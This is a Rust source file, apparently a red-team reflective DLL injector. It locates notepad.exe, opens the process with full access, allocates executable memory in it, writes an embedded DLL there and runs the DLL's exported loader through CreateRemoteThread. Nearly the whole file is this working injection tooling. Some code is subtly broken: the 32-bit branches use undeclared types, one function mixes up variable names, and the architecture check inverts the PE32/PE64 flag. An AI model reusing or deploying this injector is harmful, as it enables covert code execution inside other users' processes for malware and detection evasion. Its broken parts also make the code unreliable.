use std::{ptr::null_mut, collections::BTreeMap, ffi::{CStr}};
use sysinfo::{Pid, SystemExt, ProcessExt};
use windows_sys::Win32::{System::{Threading::{OpenProcess, PROCESS_ALL_ACCESS, IsWow64Process, CreateRemoteThread}, SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, WriteProcessMemory, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_SECTION_HEADER}, Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx}}, Foundation::{BOOL, CloseHandle}};

fn main() {
    env_logger::init();
    let process_id = get_process_id_by_name("notepad.exe") as u32;
    log::info!("[+] Process ID: {:}", process_id);

    let dll_bytes = include_bytes!("C:\\Users\\memn0ps\\Documents\\GitHub\\srdi-rs\\reflective_loader\\target\\debug\\reflective_loader.dll");
    
    let module_base = dll_bytes.as_ptr() as usize;
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
    log::info!("[+] IMAGE_DOS_HEADER: {:?}", dos_header);

    #[cfg(target_arch = "x86")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32 };
    #[cfg(target_arch = "x86_64")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64 };
    log::info!("[+] IMAGE_NT_HEADERS: {:?}", nt_headers);


    // Get a handle to the target process with all access
    let process_handle = unsafe { 
        OpenProcess(
            PROCESS_ALL_ACCESS,
            0,
            process_id
        )
    };

    if process_handle == 0 {
        panic!("Failed to open a handle to the target process");
    }

    log::info!("[+] Process handle: {:?}", process_handle);

    //Check if target process is x64 or x86
    check_arch(module_base, process_handle);

    // Allocate memory in the target process for the image
    let remote_image = unsafe { 
        VirtualAllocEx(
            process_handle,
            null_mut(),
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    };
    
    log::info!("[+] Remote allocated memory region for the dll: {:p}", remote_image);

    if remote_image == null_mut() {
        panic!("Failed to allocate memory in the target process for dll");
    }

    // Write the the local image to the target process after rebasing and resolving imports in the local process
    let wpm_result = unsafe {
        WriteProcessMemory(
            process_handle,
            remote_image as _,
            module_base as _,
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            null_mut(),
        )
    };

    if wpm_result == 0 {
        panic!("Failed to write the image to the target process");
    }

    let loader_address = get_exports_by_name(module_base as _, "memn0ps_loader".to_owned()).expect("Failed to find export");
    log::info!("[+] Local Reflective Loader Address/offset: {:?}", loader_address);

    let reflective_loader = remote_image as usize + (loader_address as usize - module_base); // module_base minus to get the offset
    log::info!("[+] Remote Reflective Loader Address/offset: {:#x}", reflective_loader);
    pause();

    // Create remote thread and execute our shellcode
    let thread_handle = unsafe { 
        CreateRemoteThread(
        process_handle,
        null_mut(),
        0,
        Some(std::mem::transmute(reflective_loader as usize)),
        remote_image,
        0,
        null_mut(),
        )
    };

    if thread_handle == 0 {
        panic!("Failed to create remote thread");
    }

    // Close thread handle
    unsafe { CloseHandle(thread_handle) };





    // The following is used for debugging.

    let get_peb_ldr = get_exports_by_name(module_base as _, "get_peb_ldr".to_owned()).expect("Failed to find export");
    log::info!("[+] get_peb_ldr: {:#x}", remote_image as usize + (get_peb_ldr as usize - module_base));

    let set_exported_functions_by_name = get_exports_by_name(module_base as _, "set_exported_functions_by_name".to_owned()).expect("Failed to find export");
    log::info!("[+] set_exported_functions_by_name: {:#x}", remote_image as usize + (set_exported_functions_by_name as usize - module_base));

    //let get_exports_by_name_address = get_exports_by_name(module_base as _, "get_exports_by_name".to_owned()).expect("Failed to find export");
    //log::info!("[+] get_exports_by_name: {:#x}", remote_image as usize + (get_exports_by_name_address as usize - module_base));

    let get_module_exports = get_exports_by_name(module_base as _, "get_module_exports".to_owned()).expect("Failed to find export");
    log::info!("[+] get_module_exports: {:#x}", remote_image as usize + (get_module_exports as usize - module_base));

    let get_loaded_modules_by_name = get_exports_by_name(module_base as _, "get_loaded_modules_by_name".to_owned()).expect("Failed to find export");
    log::info!("[+] get_loaded_modules_by_name: {:#x}", remote_image as usize + (get_loaded_modules_by_name as usize - module_base));

    let copy_sections_to_local_process = get_exports_by_name(module_base as _, "copy_sections_to_local_process".to_owned()).expect("Failed to find export");
    log::info!("[+] copy_sections_to_local_process: {:#x}", remote_image as usize + (copy_sections_to_local_process as usize - module_base));

    //let copy_headers = get_exports_by_name(module_base as _, "copy_headers".to_owned()).expect("Failed to find export");
    //log::info!("[+] copy_headers: {:#x}", remote_image as usize + (copy_headers as usize - module_base));

    let rebase_image = get_exports_by_name(module_base as _, "rebase_image".to_owned()).expect("Failed to find export");
    log::info!("[+] rebase_image: {:#x}", remote_image as usize + (rebase_image as usize - module_base));

    let resolve_imports = get_exports_by_name(module_base as _, "resolve_imports".to_owned()).expect("Failed to find export");
    log::info!("[+] resolve_imports: {:#x}", remote_image as usize + (resolve_imports as usize - module_base));


    let entry_point = unsafe { (*nt_headers).OptionalHeader.AddressOfEntryPoint };
    log::info!("[+] entry_point: {:#x}", remote_image as usize + entry_point as usize);

    log::info!("[+] Injection Completed");

}

fn check_arch(module_base: usize, process_handle: isize) {

    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut PIMAGE_NT_HEADERS32 };
    #[cfg(target_arch = "x86_64")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64 };
    log::info!("[+] IMAGE_NT_HEADERS: {:?}", nt_headers);

    let mut target_arch_is_64: BOOL = 0;
    let mut dll_arch_is_64: BOOL = 0;
    
    //If the process is a 64-bit application running under 64-bit Windows, the value is also set to FALSE.
    if unsafe { IsWow64Process(process_handle, &mut target_arch_is_64) == 0 } {
        panic!("Failed to call IsWow64Process");
    }

    if unsafe { (*nt_headers).OptionalHeader.Magic == 0x010B } { //PE32
        dll_arch_is_64 = 1;
    } else if unsafe { (*nt_headers).OptionalHeader.Magic == 0x020B } { // PE64
        dll_arch_is_64 = 0;
    }

    if target_arch_is_64 != dll_arch_is_64 {
        panic!("The target process and DLL are not the same architecture");
    }
}

/// Get process ID by name
fn get_process_id_by_name(target_process: &str) -> Pid {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id = 0;

    for process in system.process_by_name(target_process) {
        process_id = process.pid();
    }

    return process_id;
}

/// Gets exports by name
fn get_exports_by_name(module_base: *mut u8, module_name: String) -> Option<*mut u8> {

    // loop through the module exports to find export by name
    for (name, addr) in unsafe { get_module_exports(module_base) } {
        if name == module_name {
            return Some(addr as _);
        }
    }

    return None;
}

/// Retrieves all function and addresses from the specfied modules
unsafe fn get_module_exports(module_base: *mut u8) -> BTreeMap<String, usize> {
    let mut exports = BTreeMap::new();
    
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers =  (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;

    #[cfg(target_arch = "x86_64")]
    let nt_header = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let export_directory = rva_to_file_offset_pointer(module_base as usize, 
        (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress as u32) as *mut IMAGE_EXPORT_DIRECTORY;
    
    let names = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfNames) as *const u32,
        (*export_directory).NumberOfNames as _,
    );
    
    let functions = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfFunctions) as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );
    
    let ordinals = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfNameOrdinals) as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    //log::info!("[+] Module Base: {:?} Export Directory: {:?} AddressOfNames: {names:p}, AddressOfFunctions: {functions:p}, AddressOfNameOrdinals: {ordinals:p} ", module_base, export_directory);
    for i in 0..(*export_directory).NumberOfNames {

        let name = rva_to_file_offset_pointer(module_base as usize, names[i as usize]) as *const i8;

        if let Ok(name) = CStr::from_ptr(name).to_str() {
            
            let ordinal = ordinals[i as usize] as usize;

            exports.insert(
                name.to_string(), 
                rva_to_file_offset_pointer(module_base as usize, functions[ordinal])
            );
        }
    }  
    exports
}

unsafe fn rva_to_file_offset_pointer(module_base: usize, mut rva: u32) -> usize {
    
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
    #[cfg(target_arch = "x86")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    
    let ref_nt_headers = &*nt_headers;
    
    let section_header = ((&ref_nt_headers.OptionalHeader as *const _ as usize) 
        + (ref_nt_headers.FileHeader.SizeOfOptionalHeader as usize)) as *mut IMAGE_SECTION_HEADER;
    
    let number_of_sections = (*nt_headers).FileHeader.NumberOfSections;
    
    for i in 0..number_of_sections as usize {
        let virt_address = (*section_header.add(i)).VirtualAddress;
        let virt_size = (*section_header.add(i)).Misc.VirtualSize;
        
        if virt_address <= rva && virt_address + virt_size > rva {
            rva -= (*section_header.add(i)).VirtualAddress;
            rva += (*section_header.add(i)).PointerToRawData;
            
            return module_base + rva as usize;
        }
    }
    return 0;
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}